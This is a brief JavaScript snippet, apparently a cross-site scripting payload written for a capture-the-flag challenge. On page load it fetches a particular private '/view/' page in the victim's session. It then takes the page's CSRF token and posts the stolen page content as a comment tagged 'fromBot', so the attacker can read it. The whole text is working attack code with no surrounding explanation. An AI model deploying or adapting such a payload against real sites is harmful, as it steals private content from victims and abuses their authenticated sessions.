window.onload = function() {
  fetch("/view/3981cef4-9e4c-4cc9-bed1-3ea0f6d761a1").then((res) => {
    return res.text();
  }).then(data => {
    var csrf = document.querySelector("[name=csrfmiddlewaretoken]").value;;
    var formData = new FormData();

    formData.append("csrfmiddlewaretoken", csrf);
    formData.append("creator", "fromBot");
    formData.append("body", data);

    fetch("/comment/e28417ab-d51c-4ff5-933c-0a9a6d48012c",{
        method: 'POST',
        credentials: 'omit',
        body: formData
    });

})
}
